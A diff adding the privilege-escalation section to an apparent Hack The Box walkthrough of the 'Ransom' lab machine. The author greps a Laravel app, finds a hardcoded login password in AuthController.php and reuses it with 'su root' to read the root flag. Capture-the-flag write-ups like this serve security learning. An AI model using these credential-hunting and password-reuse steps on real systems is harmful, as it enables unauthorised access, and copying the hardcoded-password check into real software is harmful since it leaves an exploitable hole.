@@ -494,3 +494,135 @@ Perfect!! We have the user flag. Intrusion ready!!
 # Privilege Escalation: htb -> root
 
 <br />
+
+After a long enumeration of the System, we find the Path /srv/prod where the laravel configuration files are hosted.
+
+<br />
+
+```bash
+htb@ransom:/srv/prod$ pwd
+/srv/prod
+htb@ransom:/srv/prod$ ls
+README.md  artisan    composer.json  config    package.json  public     routes      storage  vendor
+app        bootstrap  composer.lock  database  phpunit.xml   resources  server.php  tests    webpack.mix.js
+```
+
+<br />
+
+Since there are many files in the path, we start recursively typing in the different directories by the keyword "Auth*" (Authorization).
+
+Finally, in the /app path, we find, among others, the file "Authcontroller.php" which looks pretty good:
+
+<br />
+
+```bash
+htb@ransom:/srv/prod/app$ grep -ri "auth*"
+Providers/AuthServiceProvider.php:use Illuminate\Foundation\Support\Providers\AuthServiceProvider as ServiceProvider;
+Providers/AuthServiceProvider.php:class AuthServiceProvider extends ServiceProvider
+Providers/AuthServiceProvider.php:     * Register any authentication / authorization services.
+Providers/EventServiceProvider.php:use Illuminate\Auth\Events\Registered;
+Providers/EventServiceProvider.php:use Illuminate\Auth\Listeners\SendEmailVerificationNotification;
+Providers/RouteServiceProvider.php:     * This is used by Laravel authentication to redirect users after login.
+Providers/RouteServiceProvider.php:     * When present, controller route declarations will automatically be prefixed with this namespace.
+Models/User.php:use Illuminate\Contracts\Auth\MustVerifyEmail;
+Models/User.php:use Illuminate\Foundation\Auth\User as Authenticatable;
+Models/User.php:class User extends Authenticatable
+Http/Kernel.php:            // \Illuminate\Session\Middleware\AuthenticateSession::class,
+Http/Kernel.php:        'auth' => \App\Http\Middleware\Authenticate::class,
+Http/Kernel.php:        'auth.basic' => \Illuminate\Auth\Middleware\AuthenticateWithBasicAuth::class,
+Http/Kernel.php:        'can' => \Illuminate\Auth\Middleware\Authorize::class,
+Http/Kernel.php:        'guest' => \App\Http\Middleware\RedirectIfAuthenticated::class,
+Http/Kernel.php:        'password.confirm' => \Illuminate\Auth\Middleware\RequirePassword::class,
+Http/Kernel.php:        'verified' => \Illuminate\Auth\Middleware\EnsureEmailIsVerified::class,
+Http/Middleware/Authenticate.php:use Illuminate\Auth\Middleware\Authenticate as Middleware;
+Http/Middleware/Authenticate.php:class Authenticate extends Middleware
+Http/Middleware/Authenticate.php:     * Get the path the user should be redirected to when they are not authenticated.
+Http/Middleware/RedirectIfAuthenticated.php:use Illuminate\Support\Facades\Auth;
+Http/Middleware/RedirectIfAuthenticated.php:class RedirectIfAuthenticated
+Http/Middleware/RedirectIfAuthenticated.php:            if (Auth::guard($guard)->check()) {
+Http/Controllers/Controller.php:use Illuminate\Foundation\Auth\Access\AuthorizesRequests;
+Http/Controllers/Controller.php:    use AuthorizesRequests, DispatchesJobs, ValidatesRequests;
+Http/Controllers/AuthController.php:use Illuminate\Support\Facades\Auth;
+Http/Controllers/AuthController.php:class AuthController extends Controller
+Http/Controllers/AuthController.php:        return view('auth.login');
+Http/Controllers/TasksController.php:use Illuminate\Support\Facades\Auth;
+```
+
+<br />
+
+We apply a cat and let's go! We have a credential.
+
+<br />
+
+```bash
+htb@ransom:/srv/prod/app$ cat Http/Controllers/AuthController.php
+<?php
+
+namespace App\Http\Controllers;
+
+use App\Models\User;
+use Illuminate\Http\Request;
+use App\Http\Requests\RegisterRequest;
+use Illuminate\Support\Facades\Auth;
+use Illuminate\Support\Facades\Hash;
+
+
+
+class AuthController extends Controller
+{
+    /**
+     * Display login page.
+     * 
+     * @return \Illuminate\Http\Response
+     */
+    public function show_login()
+    {
+        return view('auth.login');
+    }
+
+
+
+    /**
+     * Handle account login
+     * 
+     */
+    public function customLogin(Request $request)
+    {
+        $request->validate([
+            'password' => 'required',
+        ]);
+
+        if ($request->get('password') == "UHC-March-Global-PW!") {
+            session(['loggedin' => True]);
+            return "Login Successful";
+        }
+  
+        return "Invalid Password";
+    }
+
+}
+```
+
+<br />
+
+We try logging in as root using the new password:
+
+<br />
+
+```bash
+htb@ransom:/srv/prod/app$ su root
+Password: 
+root@ransom:/srv/prod/app# whoami
+root
+root@ransom:/srv/prod/app# cd /root
+root@ransom:~# cat root.txt
+4d2aed6fa2e87a805c969642a1xxxxxx
+```
+
+<br />
+
+Perfect!! We have it!!
+
+I hope that you learn and have fun with this machine. Keep hacking!❤️
+
+<br />
